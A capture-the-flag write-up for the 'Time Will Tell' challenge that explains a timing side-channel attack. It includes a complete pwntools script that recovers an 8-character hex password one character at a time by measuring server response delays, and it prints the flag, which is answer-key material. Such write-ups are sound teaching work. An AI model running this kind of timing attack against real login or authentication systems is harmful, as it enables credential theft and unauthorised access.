# Time Will Tell ✅

## Challenge Description
> ![image](https://github.com/user-attachments/assets/280bfe07-686e-46ea-8889-c65f8f9b7daf)

## Approach

1. This attack relies on detecting tiny timing differences when interacting with the server. Here’s how it works:
   - 1. We start by sending a guess to the server.
     2. If the guess begins with a correct character, the server’s response time increases slightly.
     3. By measuring this time difference, we can figure out the correct character for each position.
   
   Think of it like picking a lock: we try one pin at a time, listening carefully for the click that tells us we’ve got it right.

2. To make the attack efficient, we used a script to automate the guessing process. Here’s the code:
```python
from pwn import *
import time

# Set up the connection to the server
r = remote('challenge.ctf.games', 30545)
# r = remote('localhost', 1337)

# Receive initial messages
initial_message = r.recvuntil(b': ')
print(initial_message.decode())  # Print the initial message

# Initialize the password variable
password = b'aaaaaaaa'  # Start with a default guess

# Start with a base threshold for timing
base_time = 0.35

# Loop through each position in the password
for position in range(8):
    found_character = False  # Flag to check if the character is found

    for char in '0123456789abcdef':  # Possible characters
        guess = password[:position] + bytes(char, 'utf-8') + password[position + 1:]  # Update the guess
        print(f"Trying guess: {guess.decode()}")  # Print current guess

        # Measure the time taken to send the guess and receive the response
        start_time = time.time()
        r.sendline(guess)  # Send the current guess

        # Wait for the response
        response = r.recvline()  # Receive the response line
        end_time = time.time()

        # Print the response and the time taken
        print(response.decode())  # Print the server's response
        threshold = end_time - start_time
        print(f"Time taken for guess '{guess.decode()}': {threshold:.6f} seconds")

        # Check if the response time indicates a correct character
        if threshold > base_time:
            print(f"Character '{char}' at position {position} is likely correct.")
            password = guess  # Update the password with the correct character
            found_character = True
            base_time += 0.1  # Increase the threshold for the next character
            print(f"Updated base time: {base_time:.2f}")
            break  # Move to the next character position

    # If no character was found for this position, notify
    if not found_character:
        print(f"No correct character found at position {position}.")
        break  # Exit if no valid character was found

# Final output
print(f"Cracked password: {password.decode()}")
```
   
## Flag: 
flag{74235a9216ee609538022e6689b4de5c}




   


